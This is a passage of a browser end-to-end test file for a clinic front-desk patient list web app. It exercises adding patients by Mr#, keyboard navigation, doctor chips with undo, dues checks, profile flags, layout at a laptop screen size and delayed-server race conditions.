  const checkupsNow = () => pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    return (await state.data.listDayCheckups({ branchId: 1, date: localISO() })).map((c) => [c.patient_name, c.checkup_for, c.token, c.phone]);
  });
  const checkupsBefore = await checkupsNow();
  assert.ok(checkupsBefore.length, 'the busy day has a checkup row');
  await box.fill('9816');
  await box.press('Enter');
  const row = pb.locator('table.sheet tbody tr:not(.is-checkup)', { hasText: 'Mr# 9816' });
  await row.waitFor();
  await pb.waitForFunction(() => document.activeElement?.matches('input[aria-label^="Treatment for"]') && document.activeElement.closest('tr')?.textContent.includes('Mr# 9816'));
  assert.equal(await pb.locator('.modal').count(), 0, 'no dialog in the way');
  assert.equal(await box.inputValue(), '', 'the add box is empty for the next one');
  assert.equal(await pb.locator('table.sheet tbody tr').count(), before + 1);
  // (sorted like the sheet: the new patient is Waiting with the next token, so the last waiting patient, and the waiting
  //  checkup patient of the day comes next)
  assert.deepEqual(await row.evaluate((tr) => [tr.querySelector('select[aria-label^="Status for"]').value, tr.nextElementSibling?.dataset.kind]), ['waiting', 'checkup'], 'the new patient is the last waiting patient, above the waiting checkup row');
  await pb.keyboard.type('Monthly PC');
  await pb.keyboard.press('Enter');
  assert.ok(await box.evaluate((el) => el === document.activeElement), 'Enter in the patient just added goes to the add box, the sheet\'s next empty row');
  // the rhythm goes on: the next Mr# and Enter adds the next patient
  await pb.keyboard.type('9821');
  await pb.keyboard.press('Enter');
  const row2 = pb.locator('table.sheet tbody tr:not(.is-checkup)', { hasText: 'Mr# 9821' });
  await row2.waitFor();
  await pb.waitForFunction(() => document.activeElement?.matches('input[aria-label^="Treatment for"]') && document.activeElement.closest('tr')?.textContent.includes('Mr# 9821'));
  await pb.waitForSelector('.save-state[data-state="saved"]', { timeout: 5000 });
  assert.equal(await row.locator('input[aria-label^="Treatment for"]').inputValue(), 'Monthly PC');
  assert.deepEqual(await checkupsNow(), checkupsBefore, 'the checkup rows are unchanged');
  // Arrow Down still goes into the checkup row and ArrowUp comes back to the same column; Enter in a row the add line did not
  // just put the cursor in moves down
  const label = () => pb.evaluate(() => document.activeElement?.getAttribute('aria-label'));
  await pb.keyboard.press('ArrowDown');
  assert.ok(await pb.evaluate(() => document.activeElement?.closest('tr')?.dataset.kind === 'checkup' && document.activeElement.matches('input[aria-label^="Treatment for"]')), 'Arrow Down into the checkup row: ' + await label());
  await pb.keyboard.press('ArrowUp');
  await pb.keyboard.press('ArrowUp');
  assert.equal(await label(), await row.locator('input[aria-label^="Treatment for"]').getAttribute('aria-label'), 'ArrowUp comes back to the same column');
  await pb.keyboard.press('Enter');
  assert.equal(await label(), await row2.locator('input[aria-label^="Treatment for"]').getAttribute('aria-label'), 'Enter moved down to the patient below');
  await pb.evaluate(() => document.activeElement?.blur());
  // a name (not an exact Mr#) still shows the matches to choose from
  await box.fill('Sample Patient 11');
  await box.press('Enter');
  await pb.locator('.add-panel .suggestions button', { hasText: 'Sample Patient 110' }).waitFor();
  await box.fill('');
  await pb.keyboard.press('Escape');
});
await step('busy day: every action of the old list is still reachable (row actions, notes, + add doctor with undo, quick-tap, group, dues check, quick filters, checkup Options, New invoice from Pending)', async () => {
  // row actions behind a click on the name: guidance, upload photos, Bill (the invoice), take payment, Dr. Ali, profile, notes
  const r10 = pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 010' });
  await r10.locator('.name-btn').click();
  const m = pb.locator('.modal');
  await m.locator('h2:has-text("Sample Patient 010 · Mr# 7010")').waitFor();
  // (the front desk does not upload clinic photos: Dr. Ali's dialog below has that button)
  for (const name of ['Bill', 'Take payment', 'Next appointment with Dr. Ali', 'Open profile']) assert.ok(await m.getByRole('button', { name }).count(), name);
  assert.ok(await m.locator('.stat').count(), 'braces guidance');
  await m.getByLabel('Notes').fill('Bring the retainer case');
  await pb.keyboard.press('Escape');
  // (saved by itself; the list shows no note mark, the patient's profile shows the note)
  await expectNote(pb, 'Sample Patient 010', 'Bring the retainer case');
  // + add a doctor (the braces rule applies), remove with undo
  const r82 = pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 082' });
  assert.equal(await r82.locator('.person').count(), 0);
  await r82.locator('.add-person').click();
  await pb.click('.modal button:has-text("Dr. Nida (sample)")');
  await pb.waitForSelector('.toast:has-text("Dr. Nida (sample) added to Sample Patient 082")');
  await pb.locator('.modal').getByRole('button', { name: 'Done' }).click();
  await r82.locator('.person:has-text("Dr. Nida (sample)")').waitFor();
  // one click on the chip's × removes, as before (on a laptop the × shows on the chip under the mouse), and Undo brings them back
  await r82.locator('.person:has-text("Dr. Nida (sample)")').hover();
  await r82.getByRole('button', { name: 'Remove Dr. Nida (sample) from Sample Patient 082' }).click();
  await r82.locator('.person').waitFor({ state: 'detached' });
  await pb.getByRole('button', { name: 'Undo' }).click();
  await r82.locator('.person:has-text("Dr. Nida (sample)")').waitFor();
  // and from the "+" dialog; its Undo stays on the bar above the list once the dialog is closed
  await r82.locator('.add-person').click();
  await pb.locator('.modal').getByRole('button', { name: 'Remove Dr. Nida (sample) from Sample Patient 082' }).click();
  await r82.locator('.person').waitFor({ state: 'detached' });
  await pb.locator('.modal').getByRole('button', { name: 'Done' }).click();
  await pb.waitForSelector('.modal', { state: 'detached' });
  await pb.getByRole('button', { name: 'Undo' }).click();
  await r82.locator('.person:has-text("Dr. Nida (sample)")').waitFor();
  // quick-tap treatment details
  await r82.locator('.quick-tap').click();
  await pb.locator('.modal button:has-text("016")').click();
  await pb.locator('.modal button:has-text("PC")').first().click();
  await pb.locator('.modal').getByRole('button', { name: 'Done' }).click();
  assert.match(await r82.locator('input[aria-label^="Treatment details"]').inputValue(), /016 PC$/);
  // the group chip saves at once and takes its colour
  await r82.locator('select[aria-label^="Doctor group for"]').selectOption('2');
  await pb.waitForFunction(() => [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.textContent.includes('Sample Patient 082'))?.querySelector('select[aria-label^="Doctor group for"]').classList.contains('gs-green'));
  // status change with the dues check (warn mode: the front desk is told to clear dues first)
  await pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 084' }).locator('select[aria-label^="Status for"]').selectOption('in_treatment');
  await pb.waitForSelector('.toast:has-text("Clear dues first")');
  // the status counts are quick filters
  await pb.locator('.sheet-counts button', { hasText: 'Waiting' }).click();
  const shown = await pb.locator('table.sheet tbody select[aria-label^="Status for"]').evaluateAll((els) => els.map((e) => e.value));
  assert.ok(shown.length > 5 && shown.every((v) => v === 'waiting'), 'only waiting rows');
  assert.equal(await pb.locator('.sheet-counts button', { hasText: 'Waiting' }).getAttribute('aria-pressed'), 'true');
  await pb.locator('.sheet-counts button', { hasText: 'Waiting' }).click();
  assert.ok((await pb.locator('table.sheet tbody tr').count()) > 120, 'a second click shows everyone again');
  // the ▾ of a heading opens the filter for that column
  await pb.getByRole('button', { name: 'Filter by doctor', exact: true }).click();
  assert.equal(await pb.evaluate(() => document.activeElement?.getAttribute('aria-label')), 'Filter by doctor');
  await pb.keyboard.press('Escape');
  assert.ok(await pb.locator('#sheet-filter-panel').isHidden(), 'Escape closes the filters');
  // a checkup row: its own cells, status and Options (follow-up, notes, register, remove)
  const ck = pb.locator('table.sheet tbody tr.is-checkup', { has: pb.locator('input[aria-label="Name of checkup patient Imtiaz Gill"]') });
  await ck.getByRole('button', { name: 'Checkup options for Imtiaz Gill' }).click();
  for (const name of ['Register as patient', 'Open in the checkup list']) assert.ok(await pb.locator('.modal').getByRole('button', { name }).or(pb.locator('.modal').getByRole('link', { name })).count(), name);
  await pb.locator('.modal').getByLabel('Notes').fill('Will call back');
  await pb.locator('.modal').getByRole('button', { name: 'Done' }).click();
  await pb.waitForSelector('.save-state[data-state="saved"]', { timeout: 5000 });
  // New invoice from a Pending chip
  await pb.locator('table.sheet tbody button.invoice-pending.gs-darkred').first().click();
  await pb.locator('.modal h2:has-text("New invoice ·")').waitFor();
  await pb.locator('.modal').getByRole('button', { name: 'Cancel' }).click();
  await pb.waitForSelector('.modal', { state: 'detached' });
  assert.ok(await pb.getByRole('link', { name: 'Queue board' }).count(), 'Queue board');
});
await step('busy day: a note typed in the row\'s dialog, then a payment taken there: closing the dialog keeps the new P.P (the row is drawn from the list as it is now, with the note)', async () => {
  const r7 = pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 007' });
  const pp = () => r7.locator('td.pp').innerText();
  assert.match(await pp(), /^11\.5k/);
  await r7.locator('.name-btn').click();
  await pb.locator('.modal').getByLabel('Notes').fill('Pays at the desk');
  await pb.locator('.modal').getByRole('button', { name: 'Take payment' }).click();
  await pb.locator('.modal:has(h2:has-text("Take payment · Sample Patient 007"))').getByRole('button', { name: 'Save payment' }).click();
  await pb.waitForSelector('.toast:has-text("Payment of Rs 11,500 saved")');
  // (the payment reloads the list: the new row shows P.P 0 while the row's dialog is still open)
  await pb.waitForFunction(() => /^0/.test([...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.textContent.includes('Sample Patient 007'))?.querySelector('td.pp').innerText));
  await pb.keyboard.press('Escape');
  await pb.waitForSelector('.modal', { state: 'detached' });
  assert.match(await pp(), /^0/, 'P.P is still 0 after the dialog is closed');
  await expectNote(pb, 'Sample Patient 007', 'Pays at the desk');
  await pb.waitForSelector('.save-state[data-state="saved"]', { timeout: 5000 });
});
await step('busy day at 1366x768: every treatment of the list is whole in the Treatment column, and the cells themselves do not clip (that made typing slow on a long list)', async () => {
  const r = await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    document.activeElement?.blur();
    const input = document.querySelector('table.sheet tbody tr:not(.is-checkup) input[aria-label^="Treatment for"]');
    const before = input.value;
    const names = [...state.ref.treatments.filter((t) => !t.price_list).map((t) => t.name), 'Monthly / Followup']; // the visit types (the price list is for invoices)
    const cut = names.filter((n) => { input.value = n; return input.scrollWidth > input.clientWidth; });
    input.value = before; // (set without an input event: nothing is saved)
    const clips = [...document.querySelector('table.sheet tbody tr').children].filter((td) => getComputedStyle(td).overflowX !== 'visible').map((td) => td.className);
    return { n: names.length, cut, clips };
  });
  assert.ok(r.n >= 20 && r.cut.length === 0, 'cut short: ' + JSON.stringify(r));
  assert.deepEqual(r.clips, [], 'cells that clip');
});
// Every chip's × that can be reached is in its chip and takes the click or tap (a × cut off by the cell would send it to
// the next cell). On a touch screen each × is in sight. On a laptop a × shows only over the chip under the mouse (or with
// the keyboard on it); the first chip of a row shows its name whole, a later one at least a few letters, or it is out of
// sight whole, counted in the "+" ("+2", its tooltip naming who) and its × out of the Tab order. A name cut short is whole
// in the chip's tooltip, and "Dr." (left off the chip) is still read out.
const checkChips = () => {
  const laptop = matchMedia('(min-width: 900px) and (hover: hover) and (pointer: fine)').matches;
  const blocked = [];
  const unreadable = [];
  const firstCut = [];
  const miscounted = [];
  const hiddenReachable = [];
  const shownUnhovered = [];
  let hiddenChips = 0;
  const all = [...document.querySelectorAll('table.sheet tbody .chip-remove')].filter((x) => x.getClientRects().length);
  const xs = all.filter((x) => x.tabIndex >= 0);
  for (const x of xs) {
    if (laptop && getComputedStyle(x).opacity !== '0') shownUnhovered.push(x.getAttribute('aria-label'));
    x.scrollIntoView({ block: 'center', inline: 'center' });
    const r = x.getBoundingClientRect();
    const hit = document.elementFromPoint(r.left + r.width / 2, r.top + r.height / 2);
    if (!hit || !x.contains(hit)) blocked.push(`${x.getAttribute('aria-label')}: ${hit?.className || hit?.tagName}`);
  }
  for (const cell of document.querySelectorAll('table.sheet tbody .people')) {
    const chips = [...cell.querySelectorAll('.person')];
    if (!chips.length) continue;
    const box = cell.querySelector('.people-chips').getBoundingClientRect();
    const hidden = chips.filter((c) => c.getBoundingClientRect().top >= box.bottom - 1);
    hiddenChips += hidden.length;
    for (const c of hidden) if (c.querySelector('.chip-remove')?.tabIndex >= 0) hiddenReachable.push(c.title);
    const count = cell.querySelector('.people-count');
    const tip = (count.closest('button') || count).title;
    if (count.textContent !== (hidden.length ? `+${hidden.length}` : count.dataset.plain) || hidden.some((c) => !tip.includes(c.title))) miscounted.push(`${count.textContent} ${tip}`);
    chips.forEach((p, i) => {
      const n = p.querySelector('.person-name');
      const name = [...n.childNodes].filter((c) => c.nodeType === Node.TEXT_NODE).map((c) => c.textContent).join('').trim();
      const cut = n.scrollWidth > n.clientWidth + 0.5;
      if (/^Dr\b/.test(p.title) && !/^(Checked by )?Dr\.? /.test(n.textContent)) unreadable.push(`${name}: no "Dr." read out`);
      if (cut && !p.title.includes(name)) unreadable.push(name);
      if (laptop && i === 0 && cut) firstCut.push(name);
      if (laptop && cut && !hidden.includes(p) && n.clientWidth < 40) unreadable.push(`${name}: ${n.clientWidth}px`);
    });
  }
  const wrap = document.querySelector('.sheet-wrap');
  wrap.scrollTop = 0; wrap.scrollLeft = 0; window.scrollTo(0, 0);
  return { laptop, n: xs.length, all: all.length, people: document.querySelectorAll('table.sheet tbody .person').length, blocked, unreadable, firstCut, miscounted, hiddenChips, hiddenReachable, shownUnhovered };
};
await step('busy day at 1366x768: a chip\'s × shows only over the chip under the mouse or with the keyboard on it (it takes no room), the first name of a row is whole, the others show a few letters at least or are counted in the "+", and the "+" dialog lists who is on the visit with Remove and Undo', async () => {
  await pb.mouse.move(0, 0);
  // (the list is sorted like the sheet, so the rows with the most chips, Completed, are at the bottom, where the toast of
  //  the payment taken above sits for a few seconds: it is let go first)
  await pb.waitForFunction(() => !document.querySelector('#toasts .toast'), null, { timeout: 15000 });
  const c = await pb.evaluate(checkChips);
  assert.ok(c.laptop && c.people >= 140 && c.n >= 120, 'chips, each with a ×: ' + JSON.stringify(c));
  assert.deepEqual(c.shownUnhovered, [], 'a × in sight with no mouse or keyboard on its chip');
  assert.deepEqual(c.blocked, [], 'a × that does not take the click: ' + JSON.stringify(c.blocked));
  assert.deepEqual(c.firstCut, [], 'a first name cut short');
  assert.deepEqual(c.unreadable, [], 'a name that cannot be read');
  assert.deepEqual(c.miscounted, [], 'a "+" that does not count the chips out of sight');
  assert.ok(c.hiddenChips > 0 && c.hiddenChips < 20, 'a few chips out of sight, counted in their "+": ' + c.hiddenChips);
  assert.deepEqual(c.hiddenReachable, [], 'a chip out of sight whose × can be reached with Tab');
  // the × shows on hover and with the keyboard, over the end of its chip
  const r1x = pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 001' });
  const shown = async (x) => x.evaluate((el) => { const r = el.getBoundingClientRect(); const c = el.closest('.person').getBoundingClientRect(); return getComputedStyle(el).opacity === '1' && r.right <= c.right + 0.5 && r.left >= c.left - 0.5 && r.width >= 24 && r.height >= 24; });
  await r1x.locator('.person').first().hover();
  assert.ok(await shown(r1x.locator('.person').first().locator('.chip-remove')), 'the × over the chip under the mouse');
  await pb.mouse.move(0, 0);
  await r1x.locator('select[aria-label^="Doctor group for"]').focus();
  await pb.keyboard.press('Tab');
  assert.match(await pb.evaluate(() => document.activeElement?.getAttribute('aria-label')), /^Remove .+ from Sample Patient 001$/, 'Tab from Group reaches the first chip\'s ×');
  assert.ok(await pb.evaluate(() => getComputedStyle(document.activeElement).opacity === '1'), 'and it shows');
  await pb.evaluate(() => document.activeElement?.blur());
  // the checker of Sample Patient 001, removed and brought back from the "+" dialog
  const r1 = pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 001' });
  const name = (await r1.locator('.person.checker').getAttribute('title')).replace(/ \(checked\)$/, '');
  await r1.locator('.add-person').click();
  const dlg = pb.locator('.modal');
  await dlg.locator('.people-on-list li', { hasText: `Checked by: ${name}` }).waitFor();
  assert.ok(await dlg.locator('.people-on-list li', { hasText: /^Doctor: / }).count(), 'the doctor is listed too');
  await dlg.getByRole('button', { name: `Remove ${name} (checker) from Sample Patient 001` }).click();
  await r1.locator('.person.checker').waitFor({ state: 'detached' });
  await dlg.locator('.people-on-undo', { hasText: `${name} removed.` }).waitFor();
  assert.equal(await pb.evaluate(() => document.activeElement?.textContent), 'Undo', 'the cursor is on the Undo of the dialog');
  await dlg.locator('.people-on-undo').getByRole('button', { name: 'Undo' }).click();
  await r1.locator('.person.checker').waitFor();
  await pb.waitForFunction((n) => document.activeElement?.getAttribute('aria-label') === `Remove ${n} (checker) from Sample Patient 001`, name);
  await dlg.getByRole('button', { name: 'Done' }).click();
  await pb.waitForSelector('.modal', { state: 'detached' });
});
await step('round 3: no flags on the list: no See Dr. Ali, medical, dues or note marker beside any name (dues stay in the P.P column), and the row\'s dialog still has them', async () => {
  // Owner, 11 Oct 2026: "the flags column shouldn't be here, it should be marked like this on the patient's profile where
  // his details and bills are". (Sample Patient 111 has a medical history, the Dr. Ali flag and a note; 021 has dues.)
  const marks = await pb.evaluate(() => [...document.querySelectorAll('table.sheet tbody tr:not(.is-checkup) th.name-col')]
    .flatMap((th) => [...th.querySelectorAll('.badge, .name-flags, .note-mark')].map((el) => `${th.textContent.trim()}: ${el.className}`)));
  assert.deepEqual(marks, [], 'markers beside a name');
  assert.equal(await pb.getByRole('button', { name: 'Sample Patient 111', exact: true }).count(), 1, 'the name reads as the name alone');
  assert.match(await pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 021' }).locator('td.pp').innerText(), /^11\.5k/, 'dues stay in the P.P column');
  // the row's dialog (a click on the name) is as it was: medical history, the Dr. Ali flag and the note
  await pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 111' }).locator('.name-btn').click();
  const m = pb.locator('.modal');
  await m.locator('h2:has-text("Sample Patient 111")').waitFor();
  assert.match((await m.locator('.alert').allInnerTexts()).join(' | '), /Medical history: Diabetes.*Flagged: next appointment should be with Dr\. Ali Rashid/s);
  assert.equal(await m.getByLabel('Notes').inputValue(), 'Wants an evening slot next time');
  await pb.keyboard.press('Escape');
  await pb.waitForSelector('.modal', { state: 'detached' });
});
await step('round 3: the patient\'s profile shows those flags beside the name: Medical history, See Dr. Ali, dues and the latest visit note', async () => {
  // "Open profile" in the row's dialog
  await pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 111' }).locator('.name-btn').click();
  await pb.locator('.modal').getByRole('button', { name: 'Open profile' }).click();
  await pb.locator('h1:text-is("Sample Patient 111")').waitFor();
  const badges = await pb.locator('.profile-head .profile-flags .badge').allInnerTexts();
  const at = (re) => badges.findIndex((t) => re.test(t));
  assert.ok(at(/Medical history/) === 0 && at(/^See Dr\. Ali$/) === 1, 'medical history, then See Dr. Ali, first: ' + JSON.stringify(badges));
  assert.ok(at(/^Note \(.+\): Wants an evening slot next time$/) === 2 && at(/public photo consent/) > 2, 'then the latest visit note, before the consent badges: ' + JSON.stringify(badges));
  assert.match(await pb.locator('.profile-flags .badge-note').getAttribute('title'), /^Visit note, .+: Wants an evening slot next time$/);
  await shot(pb, '23-profile-flags');
  // a patient with dues (P.P 11.5k on the list): the dues badge
  const id = await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    return (await state.data.listVisits({ branchId: 1, date: localISO() })).find((v) => v.patient.full_name === 'Sample Patient 021').patient_id;
  });
  await pb.evaluate((pid) => { location.hash = `#/staff/patient/${pid}`; }, id);
  await pb.locator('h1:text-is("Sample Patient 021")').waitFor();
  assert.match(await pb.locator('.profile-head .profile-flags .badge-dues').innerText(), /Pending dues Rs 11,500/);
  assert.equal(await pb.locator('.profile-flags .badge-note, .profile-flags .badge-ali').count(), 0, 'no note or Dr. Ali flag for this one');
  // back to the busy list (the demo keeps its data in memory: never reload)
  await pb.evaluate(() => { location.hash = '#/staff/sheet?demo=busy'; });
  await pb.waitForFunction(() => document.querySelectorAll('table.sheet tbody tr').length >= 120);
});
await step('busy day: the Mr# of a patient already on the list adds no second row (a booked patient is marked Waiting); picked from the matches, it asks first', async () => {
  const box = pb.locator('.add-panel input[type=search]');
  const count = () => pb.locator('table.sheet tbody tr').count();
  const before = await count();
  // Sample Patient 113 is booked: now Waiting with a token, the cursor in their Treatment cell
  await box.fill('7113');
  await box.press('Enter');
  await pb.waitForSelector('.toast:has-text("Sample Patient 113 was booked: now Waiting with token")');
  const r113 = pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 113' });
  assert.equal(await r113.count(), 1, 'one row for Sample Patient 113');
  assert.equal(await r113.locator('select[aria-label^="Status for"]').inputValue(), 'waiting');
  assert.match(await r113.locator('.token').innerText(), /\d/);
  await pb.waitForFunction(() => document.activeElement?.matches('input[aria-label="Treatment for Sample Patient 113"]'));
  // Saad Malik is Waiting already: the cursor goes to his Status
  await box.fill('9826');
  await box.press('Enter');
  await pb.waitForSelector('.toast:has-text("Saad Malik is already on the list (token 3)")');
  await pb.waitForFunction(() => document.activeElement?.matches('select[aria-label="Status for Saad Malik"]'));
  assert.equal(await count(), before, 'no row added');
  assert.equal(await box.inputValue(), '');
  // picked from the matches: asked first, and "Go to the row" adds nothing
  await box.fill('Saad Malik');
  await pb.locator('.add-panel .suggestions button', { hasText: 'Mr# 9826' }).click();
  await pb.locator('.modal h2:has-text("Saad Malik is already on the list (token 3)")').waitFor();
  await pb.locator('.modal').getByRole('button', { name: 'Go to the row' }).click();
  await pb.waitForFunction(() => document.activeElement?.matches('select[aria-label="Status for Saad Malik"]'));
  assert.equal(await count(), before, 'still no row added');
});
await step('busy day, slow server: the add box is empty at once after Enter, so a second Mr# typed meanwhile is added too, and text typed while an add is on its way stays in the box', async () => {
  await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const d = state.data;
    window.__fast = { searchPatients: d.searchPatients, addVisit: d.addVisit };
    const later = (fn) => async (...a) => { await new Promise((r) => setTimeout(r, 450)); return fn.apply(d, a); };
    d.searchPatients = later(window.__fast.searchPatients);
    d.addVisit = later(window.__fast.addVisit);
  });
  const box = pb.locator('.add-panel input[type=search]');
  const before = await pb.locator('table.sheet tbody tr').count();
  await box.fill('9822');
  await box.press('Enter');
  assert.equal(await box.inputValue(), '', 'emptied at once');
  await box.pressSequentially('9823');
  await box.press('Enter');
  await pb.waitForFunction((n) => document.querySelectorAll('table.sheet tbody tr').length === n + 2, before);
  for (const mr of ['9822', '9823']) assert.equal(await pb.locator('table.sheet tbody tr', { hasText: `Mr# ${mr}` }).count(), 1, `Mr# ${mr} added once`);
  await box.fill('9824');
  await box.press('Enter');
  await box.pressSequentially('Scal');
  await pb.locator('table.sheet tbody tr', { hasText: 'Mr# 9824' }).waitFor();
  await pb.waitForTimeout(300);
  assert.equal(await box.inputValue(), 'Scal', 'what was typed meanwhile is kept');
  assert.ok(await box.evaluate((el) => el === document.activeElement), 'and the cursor stays in the box');
  await box.fill('');
  await pb.keyboard.press('Escape');
  await pb.evaluate(async () => { const { state } = await import('/js/state.js'); Object.assign(state.data, window.__fast); });
});
await step('busy day, slow server: four Mr#s typed back to back are all added, and an add that comes back after the next Enter never takes the cursor out of the add box (no Treatment is changed)', async () => {
  // Each add waits until the test lets it go, so it comes back after the next Mr# has been entered, with the box empty.
  await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const d = state.data;
    window.__fastAdd = d.addVisit;
    window.__held = [];
    window.__adds = 0;
    d.addVisit = async (...a) => { window.__adds++; await new Promise((r) => window.__held.push(r)); return window.__fastAdd.apply(d, a); };
  });
  const cells = () => pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    const visits = await state.data.listVisits({ branchId: 1, date: localISO() });
    const checkups = await state.data.listDayCheckups({ branchId: 1, date: localISO() });
    return Object.fromEntries([...visits.map((v) => [v.id, `${v.patient.mr_number} ${v.treatment_label}|${v.details_text}`]), ...checkups.map((c) => [c.id, `${c.patient_name} ${c.checkup_for}|${c.details}`])]);
  });
  const before = await cells();
  const box = pb.locator('.add-panel input[type=search]');
  const adds = (n) => pb.waitForFunction((k) => window.__adds >= k, n);
  const letGo = () => pb.evaluate(() => window.__held.shift()());
  const inBox = () => pb.evaluate(() => document.activeElement?.matches('.add-panel input[type=search]'));
  await box.focus();
  await pb.keyboard.type('9828', { delay: 60 });
  await pb.keyboard.press('Enter');
  await adds(1);
  await pb.keyboard.type('9829', { delay: 60 });
  await pb.keyboard.press('Enter');
  await adds(2);
  await letGo(); // 9828 comes back now: the box is empty, but 9829 was entered since
  await pb.locator('table.sheet tbody tr', { hasText: 'Mr# 9828' }).waitFor();
  await pb.waitForTimeout(100);
  assert.ok(await inBox(), 'the cursor stays in the add box');
  await pb.keyboard.type('9830', { delay: 60 });
  await pb.keyboard.press('Enter');
  await adds(3);
  await letGo(); // 9829
  await pb.keyboard.type('9831', { delay: 60 });
  await pb.keyboard.press('Enter');
  await adds(4);
  await letGo(); // 9830
  await pb.locator('table.sheet tbody tr', { hasText: 'Mr# 9830' }).waitFor();
  await pb.waitForTimeout(100);
  assert.ok(await inBox(), 'still in the add box');
  await letGo(); // 9831, the last one: nothing entered since, so the cursor goes to its Treatment cell as usual
  await pb.waitForFunction(() => document.activeElement?.matches('input[aria-label="Treatment for Laraib Fatima"]'));
  for (const mr of ['9828', '9829', '9830', '9831']) assert.equal(await pb.locator('table.sheet tbody tr', { hasText: `Mr# ${mr}` }).count(), 1, `Mr# ${mr} added once`);
  await pb.evaluate(() => document.activeElement?.blur());
  await pb.waitForSelector('.save-state[data-state="saved"]', { timeout: 5000 });
  const after = await cells();
  const changed = Object.keys(before).filter((id) => after[id] !== before[id]).map((id) => `${before[id]} -> ${after[id]}`);
  assert.deepEqual(changed, [], 'no Treatment or details changed');
  const added = Object.keys(after).filter((id) => !(id in before)).map((id) => after[id]).sort();
  assert.deepEqual(added, ['9828 Checkup|', '9829 Checkup|', '9830 Checkup|', '9831 Checkup|']);
  await pb.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.addVisit = window.__fastAdd; });
});
await step('status change with the dues override: Dr. Ali starts treatment for a patient with dues when the clinic holds for dues', async () => {
  const px = await newPage();
  await loginAs(px, 'Dr. Ali Rashid');
  await px.evaluate(async () => { const { state } = await import('/js/state.js'); await state.data.setSetting('dues_hold_mode', 'block'); });
  await px.goto(BASE + '#/staff/sheet?branch=1');
  const row = px.locator('table.sheet tbody tr', { hasText: 'Fatima Noor' });
  await row.waitFor();
  assert.ok(await row.locator('td.pp .pp-due').count(), 'Fatima Noor has dues');
  await row.locator('select[aria-label^="Status for"]').selectOption('in_treatment');
  await px.locator('.modal h2:has-text("Pending dues")').waitFor();
  await px.locator('.modal').getByRole('button', { name: 'Override and start treatment' }).click();
  await px.waitForFunction(() => {
    const s = [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.textContent.includes('Fatima Noor'))?.querySelector('select[aria-label^="Status for"]');
    return s?.value === 'in_treatment' && s.classList.contains('gs-green');
  });
  assert.ok(await px.getByRole('button', { name: 'Download', exact: true }).count(), 'Download for Dr. Ali');
  // the row's actions behind the name include uploading photos for someone allowed to
  await row.locator('.name-btn').click();
  await px.locator('.modal').getByRole('button', { name: 'Upload photos' }).click();
  await px.locator('.modal h2:has-text("Upload photos · Fatima Noor")').waitFor();
  await px.keyboard.press('Escape');
  await px.keyboard.press('Escape');
  await px.close();
});
await step('busy day: the add box is a few Tabs from the toolbar (it comes before the list in the page), and a toast sits above the add line, clear of its buttons and of the Treatment cell of the patient just added', async () => {
  await pb.locator('input[aria-label="Find on this list"]').focus();
  let tabs = 0;
  while (tabs < 20 && !(await pb.evaluate(() => document.activeElement?.matches('.add-panel input[type=search]')))) { await pb.keyboard.press('Tab'); tabs++; }
  assert.ok(tabs <= 12, 'Tab presses from Find to the add box: ' + tabs);
  await pb.keyboard.type('9817');
  await pb.keyboard.press('Enter');
  await pb.waitForSelector('.toast:has-text("Iqra Shahid added")');
  await pb.waitForFunction(() => document.activeElement?.matches('input[aria-label="Treatment for Iqra Shahid"]'));
  const r = await pb.evaluate(() => {
    const t = [...document.querySelectorAll('.toast')].find((el) => el.textContent.includes('Iqra Shahid added')).getBoundingClientRect();
    const covers = (el) => { const b = el.getBoundingClientRect(); return !(b.right <= t.left || b.left >= t.right || b.bottom <= t.top || b.top >= t.bottom); };
    return { addLine: covers(document.querySelector('.add-panel')), cell: covers(document.activeElement), toast: [t.left, t.top, t.right, t.bottom].map(Math.round) };
  });
  assert.ok(!r.addLine && !r.cell, 'the toast covers neither the add line nor the cell being typed in: ' + JSON.stringify(r));
});
await step('busy day: an Mr# and Enter while a quick filter or Find text hides the new row clears them, so the row is in sight with the cursor in its Treatment cell', async () => {
  const box = pb.locator('.add-panel input[type=search]');
  const find = pb.locator('input[aria-label="Find on this list"]');
  await pb.locator('.sheet-counts button', { hasText: 'Completed' }).click();
  await box.fill('9818');
  await box.press('Enter');
  await pb.waitForFunction(() => document.activeElement?.matches('input[aria-label^="Treatment for"]') && document.activeElement.closest('tr')?.textContent.includes('Mr# 9818'));
  assert.match(await pb.locator('.sheet-counts button[aria-pressed="true"]').innerText(), /^All/);
  await find.fill('Sample Patient 00');
  await box.fill('9819');
  await box.press('Enter');
  await pb.waitForFunction(() => document.activeElement?.matches('input[aria-label^="Treatment for"]') && document.activeElement.closest('tr')?.textContent.includes('Mr# 9819'));
  assert.equal(await find.inputValue(), '');
  assert.ok((await pb.locator('table.sheet tbody tr').count()) > 120, 'everyone is shown again');
});
await step('busy day: a status or group picked right after typing in the same row keeps what was typed (the server\'s answer does not have it yet)', async () => {
  const rowOf = (name) => pb.locator('table.sheet tbody tr', { hasText: name });
  // (the row is drawn again from the server's answer: its P.P cell, marked before, is a new cell after; the row with the
  //  cursor keeps the cell the cursor is in, and gets new other cells)
  const redrawn = (name) => pb.waitForFunction((n) => { const tr = [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.textContent.includes(n)); return tr && !tr.querySelector('td.pp').dataset.before; }, name);
  const typeThenPick = async (name, text, label, value) => {
    await rowOf(name).locator('input[aria-label^="Treatment details for"]').click();
    await pb.keyboard.type(text);
